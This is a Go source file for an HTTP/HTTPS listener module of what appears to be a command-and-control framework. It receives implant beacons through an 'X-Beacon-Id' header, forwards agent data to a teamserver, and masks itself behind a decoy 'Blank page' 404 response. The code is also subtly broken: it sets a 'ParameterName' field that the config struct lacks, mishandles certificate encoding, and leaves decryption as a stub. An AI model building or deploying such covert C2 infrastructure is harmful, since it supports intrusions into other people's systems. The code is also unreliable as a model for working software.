package main

import (
	"context"
	"crypto/rand"
	"crypto/rsa"
	"crypto/x509"
	"encoding/base64"
	"encoding/binary"
	"encoding/pem"
	"errors"
	"fmt"
	"github.com/gin-gonic/gin"
	"io"
	"math/big"
	"net/http"
	"net/url"
	"os"
	"strings"
	"time"
)

type HTTPConfig struct {
	Ssl       bool   `json:"ssl"`
	HostBind  string `json:"host_bind"`
	PortBind  string `json:"port_bind"`
	HostAgent string `json:"host_agent"`
	PortAgent string `json:"port_agent"`
	Uri       string `json:"uri"`

	SslCert     string `json:"ssl_cert"`
	SslKey      string `json:"ssl_key"`
	SslCertPath string `json:"ssl_cert_path"`
	SslKeyPath  string `json:"ssl_key_path"`
}

type HTTP struct {
	GinEngine *gin.Engine
	Server    *http.Server
	Config    HTTPConfig
	Name      string
	Active    bool
}

func NewConfigHttp(Name string) *HTTP {
	return &HTTP{
		GinEngine: gin.New(),
		Name:      Name,
	}
}

func (h *HTTP) Start() error {
	var err error = nil

	gin.SetMode(gin.ReleaseMode)
	router := gin.Default()
	router.NoRoute(h.pageFake)
	router.POST("/*endpoint", h.processRequest)
	h.Active = true

	h.Server = &http.Server{
		Addr:    fmt.Sprintf("%s:%s", h.Config.HostBind, h.Config.PortBind),
		Handler: router,
	}

	if h.Config.Ssl {
		fmt.Println("Started listener: https://" + h.Config.HostBind + ":" + h.Config.PortBind)

		listenerPath := ModulePath + "/" + h.Name
		_, err = os.Stat(listenerPath)
		if os.IsNotExist(err) {
			err = os.Mkdir(listenerPath, os.ModePerm)
			if err != nil {
				return fmt.Errorf("failed to create %s folder: %s", listenerPath, err.Error())
			}
		}

		h.Config.SslCertPath = listenerPath + "/listener.crt"
		h.Config.SslKeyPath = listenerPath + "/listener.key"

		if h.Config.SslCert == "" || h.Config.SslKey == "" {
			err = h.generateSelfSignedCert(h.Config.SslCertPath, h.Config.SslKeyPath)
			if err != nil {
				h.Active = false
				fmt.Println("Error generating self-signed certificate:", err)
				return err
			}
		} else {
			err = os.WriteFile(h.Config.SslCertPath, []byte(h.Config.SslCert), 0600)
			if err != nil {
				return err
			}
			err = os.WriteFile(h.Config.SslKeyPath, []byte(h.Config.SslKey), 0600)
			if err != nil {
				return err
			}
		}

		go func() {
			err = h.Server.ListenAndServeTLS(h.Config.SslCertPath, h.Config.SslKeyPath)
			if err != nil && !errors.Is(err, http.ErrServerClosed) {
				fmt.Printf("Error starting HTTPS server: %v\n", err)
				return
			}
			h.Active = true
		}()

	} else {
		fmt.Println("Started listener: http://" + h.Config.HostBind + ":" + h.Config.PortBind)

		go func() {
			err = h.Server.ListenAndServe()
			if err != nil && !errors.Is(err, http.ErrServerClosed) {
				fmt.Printf("Error starting HTTP server: %v\n", err)
				return
			}
			h.Active = true
		}()
	}

	time.Sleep(300 * time.Millisecond)
	return err
}

func (h *HTTP) Stop() error {
	var (
		ctx          context.Context
		cancel       context.CancelFunc
		err          error = nil
		listenerPath       = ModulePath + "/" + h.Name
	)

	ctx, cancel = context.WithTimeout(context.Background(), 3*time.Second)
	defer cancel()

	_, err = os.Stat(listenerPath)
	if os.IsExist(err) {
		err = os.RemoveAll(listenerPath)
		if err != nil {
			return fmt.Errorf("failed to remove %s folder: %s", listenerPath, err.Error())
		}
	}

	err = h.Server.Shutdown(ctx)
	return err
}

func (h *HTTP) processRequest(ctx *gin.Context) {
	var (
		ExternalIP string
		err        error
		agentType  uint
		beat       []byte
		bodyData   []byte
	)

	h.Config.ParameterName = "X-Beacon-Id"

	valid := false
	u, err := url.Parse(ctx.Request.RequestURI)
	if err == nil {
		if h.Config.Uri == u.Path {
			valid = true
		}
	}
	if valid == false {
		h.pageFake(ctx)
		return
	}

	ExternalIP = strings.Split(ctx.Request.RemoteAddr, ":")[0]

	agentType, beat, bodyData, err = parseBeatAndData(ctx, h)
	if err != nil {
		fmt.Println("Error: " + err.Error())
		h.pageFake(ctx)
		return
	}

	err = ModuleObject.ts.AgentRequest(fmt.Sprintf("%08x", agentType), beat, bodyData, h.Name, ExternalIP)

	ctx.AbortWithStatus(http.StatusOK)
	return
}

func parseBeatAndData(ctx *gin.Context, h *HTTP) (uint, []byte, []byte, error) {
	var (
		beat      string
		agentType uint
		agentInfo []byte
		bodyData  []byte
		err       error
	)

	params := ctx.Request.Header[h.Config.ParameterName]
	if len(params) > 0 {
		beat = params[0]
	} else {
		return 0, nil, nil, errors.New("missing beat from Headers")
	}

	agentInfo, err = base64.StdEncoding.DecodeString(beat)
	if len(agentInfo) < 5 || err != nil {
		return 0, nil, nil, errors.New("failed decrypt beat")
	}

	//decrypt data

	agentType = uint(binary.BigEndian.Uint32(agentInfo[:4]))
	agentInfo = agentInfo[4:]

	bodyData, err = io.ReadAll(ctx.Request.Body)
	if err != nil {
		return 0, nil, nil, errors.New("missing agent data")
	}

	return agentType, agentInfo, bodyData, nil
}

func (h *HTTP) generateSelfSignedCert(certFile, keyFile string) error {
	priv, err := rsa.GenerateKey(rand.Reader, 2048)
	if err != nil {
		return fmt.Errorf("failed to generate private key: %v", err)
	}

	serialNumberLimit := new(big.Int).Lsh(big.NewInt(1), 128)
	serialNumber, err := rand.Int(rand.Reader, serialNumberLimit)
	if err != nil {
		return fmt.Errorf("failed to generate serial number: %v", err)
	}

	template := x509.Certificate{
		SerialNumber: serialNumber,
		NotBefore:    time.Now(),
		NotAfter:     time.Now().Add(365 * 24 * time.Hour),

		KeyUsage:              x509.KeyUsageKeyEncipherment | x509.KeyUsageDigitalSignature,
		ExtKeyUsage:           []x509.ExtKeyUsage{x509.ExtKeyUsageServerAuth},
		BasicConstraintsValid: true,
	}

	template.DNSNames = []string{h.Config.HostBind}

	derBytes, err := x509.CreateCertificate(rand.Reader, &template, &template, &priv.PublicKey, priv)
	if err != nil {
		return fmt.Errorf("failed to create certificate: %v", err)
	}

	certOut, err := os.Create(certFile)
	if err != nil {
		return fmt.Errorf("failed to create certificate file: %v", err)
	}
	defer certOut.Close()
	if err := pem.Encode(certOut, &pem.Block{Type: "CERTIFICATE", Bytes: derBytes}); err != nil {
		return fmt.Errorf("failed to write certificate: %v", err)
	}

	keyOut, err := os.Create(keyFile)
	if err != nil {
		return fmt.Errorf("failed to create key file: %v", err)
	}
	defer keyOut.Close()
	privBytes := x509.MarshalPKCS1PrivateKey(priv)
	if err := pem.Encode(keyOut, &pem.Block{Type: "RSA PRIVATE KEY", Bytes: privBytes}); err != nil {
		return fmt.Errorf("failed to write private key: %v", err)
	}

	h.Config.SslCert = string(derBytes)
	h.Config.SslKey = string(privBytes)

	return nil
}

func (h *HTTP) pageFake(ctx *gin.Context) {
	ctx.Writer.WriteHeader(http.StatusNotFound)
	html := []byte("Blank page")
	ctx.Writer.Write(html)
}
